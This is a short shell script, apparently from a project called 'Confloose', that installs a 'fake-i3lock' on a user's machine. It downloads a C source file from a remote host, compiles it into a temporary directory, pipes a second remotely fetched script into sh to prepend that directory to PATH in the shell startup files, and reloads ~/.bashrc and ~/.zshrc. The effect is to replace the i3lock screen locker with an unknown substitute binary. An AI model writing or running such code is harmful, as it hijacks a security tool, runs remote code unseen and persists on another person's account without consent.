#!/bin/sh

tempdir=$(mktemp -d)
cd "$tempdir" || exit 1
if ! curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/fake-i3lock/i3lock.c" > "$tempdir/i3lock.c"; then
    echo "fake-i3lock: download failed" >&2
    rm -rf "$tempdir"
    exit 1
fi
if ! i3lock_bin=$(command -v i3lock 2>/dev/null); then
    echo "fake-i3lock: real i3lock not found, aborting" >&2
    rm -rf "$tempdir"
    exit 1
fi
i3lock_path=$(printf '%s' "$i3lock_bin" | sed "s|/|\\\\/|g")
sed -i "s/I3LOCK_PATH/$i3lock_path/" i3lock.c
if ! gcc -o i3lock i3lock.c -std=c99; then
    echo "fake-i3lock: build failed" >&2
    rm -rf "$tempdir"
    exit 1
fi

echo $(curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-i3lock" "'export PATH=\"$tempdir:\$PATH\"'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null; done
